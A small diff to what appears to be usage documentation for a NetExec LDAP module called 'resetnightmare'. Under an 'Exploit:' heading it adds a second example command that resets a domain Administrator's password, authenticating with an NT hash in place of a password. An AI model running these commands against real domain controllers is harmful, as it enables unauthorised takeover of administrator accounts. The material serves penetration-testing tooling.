@@ -13,4 +13,5 @@ Exploit:
 
 ```bash
 nxc ldap <dc_ip> -u user -p pass -M resetnightmare -o TARGET=Administrator NEW_PASSWORD="NewPass!" UPN_USER=controlledPC$ UPN_PASSWORD="Passw0rd!"
+nxc ldap <dc_ip> -u user -p pass -M resetnightmare -o TARGET=Administrator NEW_PASSWORD='NewPass!' UPN_USER=controlled UPN_NTHASH='31d6cfe0d16ae931b73c59d7e0c089c0'
 ```
